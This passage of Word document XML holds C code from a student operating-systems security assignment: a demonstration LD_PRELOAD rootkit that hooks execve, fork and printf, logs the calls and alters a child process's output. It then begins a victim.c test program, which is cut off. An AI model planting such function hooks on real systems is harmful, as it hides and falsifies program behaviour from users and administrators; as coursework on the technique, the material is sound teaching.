    <w:p w14:paraId="6FC2F8E2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D2D689" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rk_log("execve(\"%s\") monitored (pid=%d ppid=%d)", pathname, getpid(), getppid());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247D16EB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE50458" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E48F0C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return real_execve(pathname, argv, envp);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C506234" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D42A20" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4060E12C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>pid_t fork(void)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAB1CC4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427B657E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static pid_t (*real_fork)(void) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F167E5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pid_t child;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522B7CDB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6961AE08" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_fork == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635E45E4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_fork = dlsym(RTLD_NEXT, "fork");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AC25A1" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112C5740" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    child = real_fork();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1BE9D8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (!in_hook) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E6FB21" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523CFDF9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rk_log("fork() -&gt; child pid %d (parent %d)", child, getpid());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E82342" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9D60BC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C94EA42" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return child;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EBB747" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E2D556" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311F4D70" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/* ---------- modifying output: printf ---------- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18EA8BA5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int printf(const char *format, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FBF721" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7544A40C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    static int (*real_vprintf)(const char *, va_list) = NULL;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65565253" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    va_list ap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA11EA2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    int ret;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F20F695" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA081C8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (real_vprintf == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9F8C5B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        real_vprintf = dlsym(RTLD_NEXT, "vprintf");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D84977" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19871BDF" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    in_hook = 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F44F1FB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rk_log("printf() intercepted");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43041E53" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    in_hook = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100C1E9C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFF12F3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    va_start(ap, format);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4386CAAB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (format != NULL &amp;&amp; strstr(format, "Child process") != NULL) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2519EC85" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ret = real_vprintf("[rootkit] child process message intercepted and altered\n", ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E938175" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    } else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDA48DC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ret = real_vprintf(format, ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7029F45D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149088D3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    va_end(ap);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DDD601" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return ret;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6467A58D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7746ED1C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:r>
        <w:t>victim.c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770331AC" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50957FE8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> * victim.c - target program used to demonstrate the rootkit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1258BAD4" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> * COMP60024 OSIB - Part C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71041ECB" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> * Student: Faraj Farook   ID: CB012653</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461E5266" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144BE840" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#define _GNU_SOURCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F19A6E2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5623F874" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;stdlib.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFF5780" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;unistd.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACCAFC7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;fcntl.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09803CD0" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;sys/wait.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A9B109" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#include &lt;sys/types.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F965F5" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C950FA" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>extern char **environ;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53347304" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2D4562" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>int main(void)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CB8DC7" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210AE895" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    char buf[256];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A895513" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
